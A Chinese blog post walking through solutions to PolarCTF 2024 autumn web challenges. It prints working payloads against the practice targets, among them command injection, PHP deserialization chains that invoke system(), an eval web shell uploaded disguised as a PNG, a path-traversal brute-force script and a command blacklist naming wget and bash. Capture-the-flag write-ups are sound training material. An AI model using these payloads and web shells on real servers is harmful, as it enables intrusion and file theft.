+++
title = "PolarCTF2024秋季"
slug = "polarctf-2024-autumn"
description = "什么php大王"
date = "2024-09-22T14:39:35"
lastmod = "2024-09-22T14:39:35"
image = ""
license = ""
categories = ["赛题"]
tags = ["php"]
+++

# 0x01 前言

还挺多的

# 0x02 question

## EZ_Host

进入之后很明显啊，一个命令注入

```
/?host=127.0.0.1;tac%20f*
```

## 序列一下

```php
<?php
 
class Polar{
    public $url = 'polarctf.com';
    public $lt;
    public $b;
     
     function  __destruct()
     {
        $a = $this->lt;
 
        $a($this->b);
     }
}
unserialize($_POST['x']);
highlight_file(__FILE__);
 
 
?> 
```

很简单的反序列化但是中途eval这边不行然后调试了一下下

```php
<?php
class Polar{
    public $url = 'polarctf.com';
    public $lt='system';
    //public $b='whoami';
    public $b='tac /f*';
}
echo serialize(new Polar());
```

## vm50给你flag

```php
<?php
include 'funs.php';
highlight_file(__FILE__);
if (isset($_GET['file'])) {
    if (myWaf($_GET['file'])) {
        include($_GET['file']);
    } else {
        unserialize($_GET['data']);
    }
}
```

很明显进行任意文件读取

```
?file=php://filter/convert.base64-encode/resource=funs.php
```

同时肯定又是一个序列化

```php
<?php
include 'f1@g.php';
function myWaf($data)
{
    if (preg_match("/f1@g/i", $data)) {
        echo "NONONONON0!";
        return FALSE;
    } else {
        return TRUE;
    }
}

class A
{
    private $a;

    public function __destruct()
    {
        echo "A->" . $this->a . "destruct!";
    }
}

class B
{
    private $b = array();
    public function __toString()
    {
        $str_array= $this->b;
        $str2 = $str_array['kfc']->vm50;
        return "Crazy Thursday".$str2;
    }
}
class C{
    private $c = array();
    public function __get($kfc){
        global $flag;
        $f = $this->c[$kfc];
        var_dump($$f);
    }
}
```

```
A::destruct->B::toString->C::get
```

这个还是挺有意思，首先访问`vm50`这个属性要不存在也就是我们不要在B里面赋值，然后

`var_dump($$f);`这里我们就需要把`$kfc`里面还赋值一层数组(看个`demo`就知道了)

```php
<?php
$c=array("vm50"=>"flag");
$a=array("kfc"=>$c);
$f=c[$kfc];
var_dump($$f);
```

所以触发`get`也是由于访问不到触发的，而不是不存在

```php
<?php
class A
{
    public $a;
}

class B
{
    public $b;
}
class C{
    public $c;
}
$a=new A();
$a->a=new B();
$c=new C();
$c->c=array("vm50"=>"flag");
$a->a->b=array("kfc"=>$c);

echo serialize($a);
```

```
?file=f1@g&data=O:1:"A":1:{s:1:"a";O:1:"B":1:{s:1:"b";a:1:{s:3:"kfc";O:1:"C":1:{s:1:"c";a:1:{s:4:"vm50";s:4:"flag";}}}}}
```

## Deserialize 

访问这个`/hidden/hidden.php`，又是一个反序列化

```php
<?php

class Token {
    public $id;
    public $secret;

    public function __construct($id, $secret) {
        $this->id = $id;
        $this->secret = $secret;
    }

    public function generateToken() {
        return "Token for {$this->id}";
    }
}

class User {
    public $name;
    public $isAdmin = false;
    public $token;

    public function __construct($name, $isAdmin, Token $token) {
        $this->name = $name;
        $this->isAdmin = $isAdmin;
        $this->token = $token;
    }

    public function getInfo() {
        return "{$this->name} is " . ($this->isAdmin ? "an admin" : "not an admin");
    }
}

class Product {
    public $productName;
    public $price;

    public function __construct($productName, $price) {
        $this->productName = $productName;
        $this->price = $price;
    }

    public function displayProduct() {
        return "Product: {$this->productName}, Price: {$this->price}";
    }
}

if (isset($_GET['data'])) {
    $data = $_GET['data'];
    $user = unserialize($data);
    if ($user instanceof User) {
        echo $user->getInfo() . "<br>";
        echo "Token: " . $user->token->generateToken() . "<br>";
        echo "Product: " . $user->token->product->displayProduct() . "<br>";
        if ($user->isAdmin) {
            echo "Here is your flag: " . file_get_contents('/flag');
        } else {
            echo "You are not admin!";
        }
    } else {
        echo "Invalid user data.";
    }
} else {
    highlight_file(__FILE__);
}
?>
```

这个没有链子，但是最后的会引导你进行写类和触发什么的

```php
<?php
class Token{
    public $id;
    public $secret;
}
class User{
    public $name;
    public $isAdmin=true;
    public $token;

}
class Product{
    public $productName;
    public $price;
}
$a=new User();
$a->name="bao";
$a->token=new Token();
$a->token->id=1;
$a->token->product=new Product();

echo serialize($a);
```

```
/hidden/hidden.php?data=O:4:"User":3:{s:4:"name";s:3:"bao";s:7:"isAdmin";b:1;s:5:"token";O:5:"Token":3:{s:2:"id";i:1;s:6:"secret";N;s:7:"product";O:7:"Product":2:{s:11:"productName";N;s:5:"price";N;}}}
```

## 传马

看到是阿帕奇但是说了只能用图片那就伪装一下先，等会不行再传`.htaccess`

```
POST / HTTP/1.1
Host: d020ad56-fb0d-4941-aad1-eb1857be5c29.www.polarctf.com:8090
Content-Length: 424
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://d020ad56-fb0d-4941-aad1-eb1857be5c29.www.polarctf.com:8090
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytr2beHroL6swRl2s
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://d020ad56-fb0d-4941-aad1-eb1857be5c29.www.polarctf.com:8090/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundarytr2beHroL6swRl2s
Content-Disposition: form-data; name="upload_file"; filename="3.php"
Content-Type: image/png

<?=eval($_GET[a]);?>
------WebKitFormBoundarytr2beHroL6swRl2s
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundarytr2beHroL6swRl2s--

```

```
/upload/3.php?a=echo `tac /f*`;
```

欧克比想象中简单

## bllbl_ser1

```php
<?php

class bllbl
{
    public $qiang; // 我的强

    function __destruct()
    {
        $this->bllliang();
    }

    function bllliang()
    {
        $this->qiang->close();
    }
}

class bllnbnl
{
    public $er; // 我的儿

    function close()
    {
        eval($this->er);
    }
}

if (isset($_GET['blljl'])) {
    $user_data = unserialize($_GET['blljl']);
}
```

没啥好说的

```php
<?php

class bllbl
{
    public $qiang; // 我的强
}

class bllnbnl
{
    public $er; // 我的儿
}
$a=new bllbl();
$a->qiang=new bllnbnl();
$a->qiang->er="system('tac /f*');";
echo serialize($a);
```

回显在源码里面

## 投喂

翻译一下就知道了

```php
<?php
class User{
    public $username="bao";
    public $is_admin=true;
}
$a=new User();
echo serialize($a);
```

## rapyiquan

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
header('content-type:text/html;charset=utf-8');

$url = $_SERVER['REQUEST_URI'];
function checkUrlParams($params) {
        if (strpos($params, '_') !== false) {
            return false;
        }
    return true;
}

if(checkUrlParams($url)){
    $cmd=$_GET['c_md'];
    if (preg_match("/ls|dir|flag|type|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
        echo("badly!");
    } else {
        echo `$cmd`;
    }
}else{
    echo "$url";
    echo "<br>";
    echo "Hack";
}
```

反斜杠绕过就可以了

## 1ncIud3

说的是要替换，现在是可以任意文件读取了

而且貌似这个`../`被过滤了，那么双写绕过

然后写个脚本(~~人机写的~~)

```python
import requests
from itertools import product
import time

# 定义字符替换规则
replace_list = {
    'f': [ 'f', '4','F'],
    'l': ['1', 'I', 'L', 'i','l'],
    'a': ['@', '2', '3', '4','a'],
    'g': ['g', '9', 'G', '3', '6']
}

# 目标字符串
target = "flag"

# 生成所有可能的组合
def generate_combinations(target, replace_list):
    # 将目标字符串拆分成字符列表
    chars = list(target)
    
    # 生成每个字符的所有可能替换
    replacements = []
    for char in chars:
        if char in replace_list:
            replacements.append(replace_list[char])
        else:
            replacements.append([char])
    
    # 使用 itertools.product 生成所有可能的组合
    combinations = [''.join(combination) for combination in product(*replacements)]
    
    return combinations

# 生成所有可能的组合
combinations = generate_combinations(target, replace_list)

# 目标 URL
url = "http://b0fb50b6-d341-4be9-ac28-5e346250d721.www.polarctf.com:8090/"  # 替换为实际的 API URL

# 发送请求
for combination in combinations:
    params = {"page": "..././..././"+combination}
    response = requests.get(url, params=params)
    time.sleep(0.1)
    # 打印响应
    print(f"Sent: {combination}")
    print(f"Response: {response.status_code} {response.text}")

    # 如果响应中包含特定的内容，可以停止发送请求
    if "flag" in response.text:
        print(f"Found special response with combination: {combination}")
        break
```

自己稍微改改字典

## 笑傲上传

直接传不行了，那么就插入了,随便截一张图然后用010写进去就行

查看源码发现有地方可以包含，**检查**拿到路径

进行RCE

```
/upload/1820240922085407.png
```

emm，怎么和想象中不一样那就只能用虚拟机合成了

```
cat m.png m.php > a.png
```

上传成功之后发现了问题，我还是找不到木马，后来发现是路径错了，那么也就是说010插入的方法是可行的

```
http://e4f57176-9819-4beb-b68e-6c176a1eeb9e.www.polarctf.com:8090/include.php?file=/var/www/html/upload/3120240922091401.png

POST
a=echo `tac /f*`;
```

## SnakeYaml 

这玩意不会，给个官方脚本吧

**CC6打spring内存马**

## 一写一个不吱声

依然是不会呜呜

# 0x03 小结

其他的都还好，这里的序列化比较多，也挺新颖，至少之前没见过这么触发，java得整起来了
